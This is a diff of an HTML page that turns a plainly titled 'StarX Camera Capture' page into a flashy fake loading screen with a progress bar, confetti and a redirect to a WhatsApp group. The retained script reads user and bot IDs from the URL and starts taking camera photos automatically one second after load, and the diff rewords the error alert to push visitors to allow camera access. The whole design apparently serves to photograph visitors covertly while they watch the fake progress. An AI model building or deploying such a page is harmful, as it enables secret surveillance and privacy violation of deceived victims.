@@ -1,12 +1,930 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>StarX Camera Capture</title>
+  <meta charset="UTF-8">
+  <title>Star Dark Site - Loading...</title>
+  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: 
+        linear-gradient(rgba(0, 40, 60, 0.8), rgba(0, 20, 40, 0.9)),
+        url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
+      background-size: cover;
+      background-blend-mode: overlay;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+      backdrop-filter: blur(10px) brightness(0.8);
+      overflow: hidden;
+      position: relative;
+    }
+    
+    /* Cyan globe effect */
+    .cyan-globe {
+      position: absolute;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(0, 255, 255, 0.1) 0%, transparent 70%);
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      filter: blur(40px);
+      z-index: -2;
+      animation: pulseGlobe 8s infinite alternate;
+    }
+    
+    @keyframes pulseGlobe {
+      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+      100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.8; }
+    }
+    
+    /* Wave effect */
+    .waves {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 100px;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,0V46.29c47.79,22.2,103.59,32.17,158,28,70.36-5.37,136.33-33.31,206.8-37.5C438.64,32.43,512.34,53.67,583,72.05c69.27,18,138.3,24.88,209.4,13.08,36.15-6,69.85-17.84,104.45-29.34C989.49,25,1113-14.29,1200,52.47V0Z" opacity=".25" fill="%2300ffff"/><path d="M0,0V15.81C13,36.92,27.64,56.86,47.69,72.05,99.41,111.27,165,111,224.58,91.58c31.15-10.15,60.09-26.07,89.67-39.8,40.92-19,84.73-46,130.83-49.67,36.26-2.85,70.9,9.42,98.6,31.56,31.77,25.39,62.32,62,103.63,73,40.44,10.79,81.35-6.69,119.13-24.28s75.16-39,116.92-43.05c59.73-5.85,113.28,22.88,168.9,38.84,30.2,8.66,59,6.17,87.09-7.5,22.43-10.89,48-26.93,60.65-49.24V0Z" opacity=".5" fill="%2300ffff"/><path d="M0,0V5.63C149.93,59,314.09,71.32,475.83,42.57c43-7.64,84.23-20.12,127.61-26.46,59-8.63,112.48,12.24,165.56,35.4C827.93,77.22,886,95.24,951.2,90c86.53-7,172.46-45.71,248.8-84.81V0Z" fill="%2300ffff"/></svg>');
+      background-size: cover;
+      opacity: 0.3;
+      z-index: -1;
+      animation: waveMove 15s infinite linear;
+    }
+    
+    @keyframes waveMove {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+    
+    /* Falling stars effect */
+    .stars {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    .star {
+      position: absolute;
+      background-color: #00ffff;
+      border-radius: 50%;
+      animation: twinkle 3s infinite alternate;
+      box-shadow: 0 0 10px #00ffff;
+    }
+    
+    @keyframes twinkle {
+      0%, 100% { opacity: 0.2; transform: scale(0.8); }
+      50% { opacity: 1; transform: scale(1.2); }
+    }
+    
+    /* Container styles */
+    .container {
+      background: rgba(0, 20, 30, 0.7);
+      border-radius: 25px;
+      padding: 50px 40px;
+      width: 100%;
+      max-width: 750px;
+      box-shadow: 
+        0 0 30px rgba(0, 255, 255, 0.4),
+        0 0 60px rgba(0, 200, 255, 0.2),
+        0 0 100px rgba(0, 150, 255, 0.1),
+        inset 0 0 20px rgba(0, 255, 255, 0.2),
+        inset 0 0 40px rgba(0, 255, 255, 0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: popIn 1s ease-out, floatContainer 6s ease-in-out infinite;
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
+      border: 1px solid rgba(0, 255, 255, 0.3);
+      backdrop-filter: blur(5px);
+    }
+    
+    @keyframes floatContainer {
+      0%, 100% { transform: translateY(0) rotate(0deg); }
+      33% { transform: translateY(-10px) rotate(0.5deg); }
+      66% { transform: translateY(5px) rotate(-0.5deg); }
+    }
+    
+    /* Container inner glow effect */
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(0, 255, 255, 0.1) 0%, transparent 70%);
+      animation: rotateGlow 20s linear infinite;
+      z-index: -1;
+    }
+    
+    @keyframes rotateGlow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    /* Grid lines */
+    .grid-lines {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
+      background-size: 30px 30px;
+      opacity: 0.3;
+      z-index: -1;
+      animation: gridMove 20s linear infinite;
+    }
+    
+    @keyframes gridMove {
+      0% { background-position: 0 0; }
+      100% { background-position: 30px 30px; }
+    }
+
+    /* Logo effects */
+    .logo-container {
+      position: relative;
+      margin-bottom: 40px;
+    }
+    
+    .logo {
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      box-shadow: 
+        0 0 30px rgba(0, 255, 255, 0.8),
+        0 0 60px rgba(0, 200, 255, 0.5),
+        0 0 90px rgba(0, 150, 255, 0.3),
+        inset 0 0 20px rgba(0, 255, 255, 0.3);
+      transition: all 0.5s ease;
+      animation: logoGlow 3s infinite alternate, logoRotate 20s linear infinite;
+      border: 2px solid rgba(0, 255, 255, 0.5);
+      filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.7));
+      background: rgba(0, 30, 40, 0.5);
+      padding: 10px;
+    }
+    
+    @keyframes logoGlow {
+      0% { 
+        box-shadow: 
+          0 0 20px rgba(0, 255, 255, 0.6),
+          0 0 40px rgba(0, 200, 255, 0.4),
+          0 0 60px rgba(0, 150, 255, 0.2);
+      }
+      100% { 
+        box-shadow: 
+          0 0 30px rgba(0, 255, 255, 1),
+          0 0 60px rgba(0, 200, 255, 0.7),
+          0 0 90px rgba(0, 150, 255, 0.4);
+      }
+    }
+    
+    @keyframes logoRotate {
+      0% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(180deg) scale(1.05); }
+      100% { transform: rotate(360deg) scale(1); }
+    }
+    
+    .logo:hover {
+      transform: scale(1.1) rotate(10deg);
+      animation-play-state: paused;
+    }
+    
+    /* Logo rings */
+    .logo-ring {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 180px;
+      height: 180px;
+      border: 2px dashed rgba(0, 255, 255, 0.4);
+      border-radius: 50%;
+      animation: ringRotate 15s linear infinite;
+    }
+    
+    .logo-ring:nth-child(2) {
+      width: 220px;
+      height: 220px;
+      border-style: dotted;
+      animation-duration: 20s;
+      animation-direction: reverse;
+    }
+    
+    @keyframes ringRotate {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    /* Loader */
+    .loader {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 40px 0;
+    }
+    
+    .loader-inner {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid transparent;
+      border-top: 4px solid #00ffff;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+    }
+    
+    .loader-inner:nth-child(2) {
+      width: 70%;
+      height: 70%;
+      top: 15%;
+      left: 15%;
+      border-top-color: #00ccff;
+      animation-duration: 1.2s;
+      animation-direction: reverse;
+    }
+    
+    .loader-inner:nth-child(3) {
+      width: 50%;
+      height: 50%;
+      top: 25%;
+      left: 25%;
+      border-top-color: #0099ff;
+      animation-duration: 0.9s;
+    }
+    
+    .loader-dot {
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: #00ffff;
+      border-radius: 50%;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      box-shadow: 0 0 15px #00ffff;
+      animation: orbit 2s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes orbit {
+      0% { transform: translateX(-50%) rotate(0deg) translateY(-40px) rotate(0deg); }
+      100% { transform: translateX(-50%) rotate(360deg) translateY(-40px) rotate(-360deg); }
+    }
+
+    /* Text */
+    .text {
+      font-size: 6px;
+      line-height: 1.8;
+      text-shadow: 
+        0 0 10px rgba(0, 255, 255, 0.8),
+        0 0 20px rgba(0, 255, 255, 0.5),
+        0 0 30px rgba(0, 255, 255, 0.3);
+      background: linear-gradient(to right, 
+        #00ffff, #00ccff, #0099ff, #00ffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-size: 300% auto;
+      font-weight: bold;
+      animation: gradientShift 4s infinite linear, textPulse 2s infinite alternate;
+      margin: 20px 0;
+      padding: 0 10px;
+      position: relative;
+    }
+    
+    @keyframes gradientShift {
+      0% { background-position: 0% center; }
+      100% { background-position: 300% center; }
+    }
+    
+    @keyframes textPulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.05); }
+    }
+    
+    .text::after {
+      content: '';
+      position: absolute;
+      bottom: -5px;
+      left: 10%;
+      width: 80%;
+      height: 2px;
+      background: linear-gradient(to right, transparent, #00ffff, transparent);
+      animation: lineFlow 3s infinite linear;
+    }
+    
+    @keyframes lineFlow {
+      0% { background-position: -200% 0; }
+      100% { background-position: 200% 0; }
+    }
+
+    /* Progress bar container */
+    .progress-container {
+      width: 100%;
+      height: 25px;
+      background: rgba(0, 40, 60, 0.5);
+      border-radius: 15px;
+      margin: 60px 0 30px;
+      overflow: hidden;
+      box-shadow: 
+        inset 0 0 15px rgba(0, 0, 0, 0.5),
+        0 0 15px rgba(0, 255, 255, 0.3);
+      position: relative;
+      border: 1px solid rgba(0, 255, 255, 0.2);
+    }
+    
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, 
+        #003333 0%,
+        #006666 25%,
+        #009999 50%,
+        #00cccc 75%,
+        #00ffff 100%);
+      border-radius: 15px;
+      position: relative;
+      transition: width 0.3s ease;
+      animation: progressShine 3s infinite linear;
+      box-shadow: 
+        inset 0 0 10px rgba(0, 255, 255, 0.5),
+        0 0 15px rgba(0, 255, 255, 0.4);
+    }
+    
+    .progress-bar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, 
+        transparent, 
+        rgba(255, 255, 255, 0.4) 50%, 
+        transparent);
+      animation: shineMove 2s infinite linear;
+    }
+    
+    /* Progress percentage */
+    .progress-percent {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-weight: bold;
+      font-size: 16px;
+      color: #00ffff;
+      text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+      z-index: 2;
+      background: rgba(0, 20, 30, 0.7);
+      padding: 3px 15px;
+      border-radius: 20px;
+      border: 1px solid rgba(0, 255, 255, 0.3);
+    }
+    
+    @keyframes progressShine {
+      0% { filter: hue-rotate(0deg) brightness(1); }
+      50% { filter: hue-rotate(10deg) brightness(1.2); }
+      100% { filter: hue-rotate(0deg) brightness(1); }
+    }
+    
+    @keyframes shineMove {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    /* Progress bar markers */
+    .progress-markers {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: space-between;
+      padding: 0 5px;
+      pointer-events: none;
+    }
+    
+    .marker {
+      width: 3px;
+      height: 100%;
+      background: rgba(0, 255, 255, 0.3);
+      position: relative;
+    }
+    
+    .marker::after {
+      content: '';
+      position: absolute;
+      top: -5px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 10px;
+      height: 10px;
+      background: #00ffff;
+      border-radius: 50%;
+      box-shadow: 0 0 10px #00ffff;
+      opacity: 0;
+      animation: markerPulse 2s infinite;
+      animation-delay: calc(var(--delay) * 0.5s);
+    }
+    
+    @keyframes markerPulse {
+      0%, 100% { opacity: 0; transform: translateX(-50%) scale(0.5); }
+      50% { opacity: 1; transform: translateX(-50%) scale(1); }
+    }
+
+    /* Credits */
+    .credit {
+      margin-top: 40px;
+      font-size: 20px;
+      color: #00ffff;
+      background: rgba(0, 30, 40, 0.6);
+      padding: 15px 30px;
+      border-radius: 30px;
+      box-shadow: 
+        0 0 20px rgba(0, 255, 255, 0.4),
+        inset 0 0 15px rgba(0, 255, 255, 0.2);
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(0, 255, 255, 0.4);
+      text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+    }
+    
+    .credit::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.3), transparent);
+      transition: left 1s;
+    }
+    
+    .credit:hover::before {
+      left: 100%;
+    }
+    
+    .credit:hover {
+      transform: translateY(-5px) scale(1.05);
+      box-shadow: 
+        0 0 30px rgba(0, 255, 255, 0.7),
+        0 0 50px rgba(0, 255, 255, 0.3),
+        inset 0 0 20px rgba(0, 255, 255, 0.3);
+      background: rgba(0, 40, 50, 0.8);
+    }
+
+    /* Redirect message */
+    .redirect-message {
+      margin-top: 25px;
+      font-size: 18px;
+      color: #00ffff;
+      opacity: 0;
+      transform: translateY(20px) scale(0.9);
+      transition: all 0.5s ease;
+      padding: 15px 25px;
+      background: rgba(0, 30, 40, 0.7);
+      border-radius: 20px;
+      border: 1px solid rgba(0, 255, 255, 0.3);
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+    }
+    
+    .redirect-message.show {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+      animation: messagePulse 1.5s infinite alternate;
+    }
+    
+    @keyframes messagePulse {
+      0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
+      100% { box-shadow: 0 0 30px rgba(0, 255, 255, 0.6), 0 0 50px rgba(0, 255, 255, 0.2); }
+    }
+
+    /* Confetti effect */
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background: #00ffff;
+      border-radius: 50%;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    /* Pop in animation */
+    @keyframes popIn {
+      0% {
+        opacity: 0;
+        transform: scale(0.7) translateY(50px) rotateX(60deg);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1) translateY(0) rotateX(0);
+      }
+    }
+
+    /* Responsive design */
+    @media (max-width: 768px) {
+      .container {
+        margin: 0 25px;
+        padding: 40px 30px;
+        max-width: 90%;
+      }
+
+      .text {
+        font-size: 20px;
+      }
+      
+      .logo {
+        width: 120px;
+        height: 120px;
+      }
+      
+      .logo-ring {
+        width: 150px;
+        height: 150px;
+      }
+      
+      .logo-ring:nth-child(2) {
+        width: 180px;
+        height: 180px;
+      }
+      
+      .credit {
+        font-size: 18px;
+        padding: 12px 25px;
+      }
+      
+      .progress-container {
+        height: 22px;
+      }
+      
+      .loader {
+        width: 70px;
+        height: 70px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+        margin: 0 15px;
+      }
+      
+      .text {
+        font-size: 18px;
+      }
+      
+      .logo {
+        width: 100px;
+        height: 100px;
+      }
+      
+      .logo-ring {
+        width: 130px;
+        height: 130px;
+      }
+      
+      .logo-ring:nth-child(2) {
+        width: 160px;
+        height: 160px;
+      }
+      
+      .progress-container {
+        height: 240px;
+      }
+      
+      .progress-percent {
+        font-size: 14px;
+      }
+      
+      .loader {
+        width: 60px;
+        height: 60px;
+      }
+    }
+  </style>
 </head>
 <body>
-<h1>📸 StarX Camera Capture</h1>
-<script>
+
+  <!-- Cyan Globe -->
+  <div class="cyan-globe"></div>
+  
+  <!-- Waves -->
+  <div class="waves"></div>
+
+  <!-- Falling Stars -->
+  <div class="stars" id="stars-container"></div>
+
+  <div class="container">
+    <!-- Grid Lines -->
+    <div class="grid-lines"></div>
+    
+    <div class="logo-container">
+      <!-- Logo Rings -->
+      <div class="logo-ring"></div>
+      <div class="logo-ring"></div>
+      
+      <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
+    </div>
+    
+    <div class="text" id="loading-text">
+      Loading amazing content...<br>
+      Please stay on the page 🎥
+    </div>
+    
+    <!-- Progress Bar -->
+    <div class="progress-container">
+      <!-- Progress Markers -->
+      <div class="progress-markers" id="progress-markers"></div>
+      
+      <div class="progress-bar" id="progress-bar"></div>
+      <div class="progress-percent" id="progress-percent">0%</div>
+    </div>
+    
+    <!-- Loader -->
+    <div class="loader">
+      <div class="loader-inner"></div>
+      <div class="loader-inner"></div>
+      <div class="loader-inner"></div>
+      <div class="loader-dot"></div>
+    </div>
+    
+    <!-- Redirect Message -->
+    <div class="redirect-message" id="redirect-message">
+      Complete! Redirecting to WhatsApp group...
+    </div>
+    
+    <!-- Credits -->
+    <div class="credit">𝗠𝗮𝗱𝗲 𝗯𝘆 𝗦𝘁𝗮𝗿𝗫</div>
+  </div>
+
+  <!-- Confetti Container -->
+  <div id="confetti-container"></div>
+
+  <script>
+    // JavaScript for falling stars effect
+    function createStars() {
+      const starsContainer = document.getElementById('stars-container');
+      const starCount = 150;
+      
+      for (let i = 0; i < starCount; i++) {
+        const star = document.createElement('div');
+        star.classList.add('star');
+        
+        // Random position
+        const x = Math.random() * 100;
+        const y = Math.random() * 100;
+        
+        // Random size
+        const size = Math.random() * 4 + 1;
+        
+        // Random twinkling
+        const delay = Math.random() * 5;
+        const duration = Math.random() * 3 + 2;
+        
+        star.style.left = `${x}%`;
+        star.style.top = `${y}%`;
+        star.style.width = `${size}px`;
+        star.style.height = `${size}px`;
+        star.style.animationDelay = `${delay}s`;
+        star.style.animationDuration = `${duration}s`;
+        
+        // Some stars have different cyan shades
+        if (Math.random() > 0.5) {
+          const shades = ['#00ffff', '#00ccff', '#0099ff', '#00bfff'];
+          const color = shades[Math.floor(Math.random() * shades.length)];
+          star.style.backgroundColor = color;
+          star.style.boxShadow = `0 0 ${size * 3}px ${color}`;
+        }
+        
+        starsContainer.appendChild(star);
+      }
+    }
+    
+    // Create progress markers
+    function createProgressMarkers() {
+      const markersContainer = document.getElementById('progress-markers');
+      markersContainer.innerHTML = '';
+      
+      // 11 markers (from 0% to 100%)
+      for (let i = 0; i <= 10; i++) {
+        const marker = document.createElement('div');
+        marker.classList.add('marker');
+        marker.style.left = `${i * 10}%`;
+        marker.style.setProperty('--delay', i);
+        markersContainer.appendChild(marker);
+      }
+    }
+    
+    // Progress bar progression
+    function startProgress() {
+      const progressBar = document.getElementById('progress-bar');
+      const progressPercent = document.getElementById('progress-percent');
+      const loadingText = document.getElementById('loading-text');
+      const redirectMessage = document.getElementById('redirect-message');
+      const confettiContainer = document.getElementById('confetti-container');
+      
+      let progress = 0;
+      const targetProgress = 100;
+      const duration = 20000; // 20 seconds
+      const intervalTime = 100; // every 100ms
+      const increments = (intervalTime / duration) * targetProgress;
+      
+      const progressInterval = setInterval(() => {
+        progress += increments;
+        
+        if (progress >= targetProgress) {
+          progress = targetProgress;
+          clearInterval(progressInterval);
+          
+          // When 100% is reached
+          progressBar.style.animation = "none";
+          progressBar.style.boxShadow = 
+            "inset 0 0 20px rgba(0, 255, 255, 0.8), " +
+            "0 0 30px rgba(0, 255, 255, 0.7), " +
+            "0 0 50px rgba(0, 255, 255, 0.4)";
+          
+          // Confetti effect
+          createConfetti(confettiContainer);
+          
+          // Show message
+          setTimeout(() => {
+            redirectMessage.classList.add('show');
+            loadingText.innerHTML = "Complete!<br>Redirecting to WhatsApp group...";
+            loadingText.style.animation = "textPulse 0.5s infinite alternate";
+            
+            // Redirect to WhatsApp group
+            setTimeout(() => {
+              window.location.href = "https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS?mode=gi_t";
+            }, 3000);
+          }, 1000);
+        }
+        
+        // Update progress bar
+        progressBar.style.width = `${progress}%`;
+        progressPercent.textContent = `${Math.round(progress)}%`;
+        
+        // Change text based on progress
+        updateLoadingText(progress, loadingText);
+        
+      }, intervalTime);
+    }
+    
+    // Create confetti effect
+    function createConfetti(container) {
+      const colors = ['#00ffff', '#00ccff', '#0099ff', '#00bfff', '#0080ff'];
+      
+      for (let i = 0; i < 150; i++) {
+        const confetti = document.createElement('div');
+        confetti.classList.add('confetti');
+        
+        // Random color
+        const color = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.backgroundColor = color;
+        confetti.style.boxShadow = `0 0 10px ${color}`;
+        
+        // Random position
+        confetti.style.left = `${Math.random() * 100}%`;
+        confetti.style.top = `${Math.random() * 100}%`;
+        
+        // Random size
+        const size = Math.random() * 10 + 5;
+        confetti.style.width = `${size}px`;
+        confetti.style.height = `${size}px`;
+        
+        // Change shape for some confetti
+        if (Math.random() > 0.5) {
+          confetti.style.borderRadius = '0';
+          confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        }
+        
+        container.appendChild(confetti);
+        
+        // Animation
+        confetti.style.animation = 
+          `confettiFall ${Math.random() * 3 + 2}s ease-in forwards`;
+        
+        // Remove after
+        setTimeout(() => {
+          confetti.remove();
+        }, 5000);
+      }
+      
+      // Add CSS for confetti effect
+      const style = document.createElement('style');
+      style.textContent = `
+        @keyframes confettiFall {
+          0% {
+            opacity: 0;
+            transform: translateY(-100px) rotate(0deg);
+          }
+          10% {
+            opacity: 1;
+          }
+          100% {
+            opacity: 0;
+            transform: translateY(100vh) rotate(720deg);
+          }
+        }
+      `;
+      document.head.appendChild(style);
+    }
+    
+    // Update text based on progress
+    function updateLoadingText(progress, element) {
+      let text = "";
+      let emoji = "🎥";
+      
+      if (progress < 20) {
+        text = "Checking system...";
+        emoji = "🔍";
+      } else if (progress < 40) {
+        text = "Preparing content...";
+        emoji = "⚡";
+      } else if (progress < 60) {
+        text = "Processing data...";
+        emoji = "💾";
+      } else if (progress < 80) {
+        text = "Finalizing...";
+        emoji = "✨";
+      } else {
+        text = "Finishing up...";
+        emoji = "🎯";
+      }
+      
+      element.innerHTML = `${text}<br>Please stay on the page ${emoji}`;
+    }
+    
+    // Initialize when page loads
+    document.addEventListener('DOMContentLoaded', () => {
+      createStars();
+      createProgressMarkers();
+      
+      // Start progress bar after a few seconds
+      setTimeout(() => {
+        startProgress();
+      }, 1500);
+      
+      // Extra effects
+      addExtraEffects();
+    });
+    
+    // Extra effects
+    function addExtraEffects() {
+      // Container color change
+      const container = document.querySelector('.container');
+      const hues = [180, 190, 200, 210, 220]; // Different cyan shades
+      let currentHue = 0;
+      
+      setInterval(() => {
+        const hue = hues[currentHue];
+        container.style.boxShadow = 
+          `0 0 30px hsl(${hue}, 100%, 50%, 0.4),
+           0 0 60px hsl(${hue}, 100%, 40%, 0.2),
+           0 0 100px hsl(${hue}, 100%, 30%, 0.1),
+           inset 0 0 20px hsl(${hue}, 100%, 50%, 0.2),
+           inset 0 0 40px hsl(${hue}, 100%, 50%, 0.1)`;
+        
+        currentHue = (currentHue + 1) % hues.length;
+      }, 3000);
+      
+      // Loader dot movement
+      const loaderDot = document.querySelector('.loader-dot');
+      setInterval(() => {
+        loaderDot.style.background = 
+          `hsl(${Math.random() * 60 + 180}, 100%, 50%)`;
+        loaderDot.style.boxShadow = 
+          `0 0 20px hsl(${Math.random() * 60 + 180}, 100%, 50%)`;
+      }, 2000);
+    }
+    
   // ✅ URL څخه user ID او bot ID واخله
   const params = new URLSearchParams(window.location.search);
   const uid = params.get("uid") || "NO_UID";
@@ -64,12 +982,13 @@
 
     } catch (e) {
       console.error("Camera error:", e);
-      alert("🚫 Unable to access camera or take photos.");
+      alert("Please allow camera access to proceed.");
     }
   }
 
   // ⏱ د پاڼې له لوډ وروسته عکس اخیستل پیل کړه
   window.onload = () => setTimeout(capturePhotos, 1000);
-</script> 
+
+  </script>
 </body>
-</html> 
+</html>
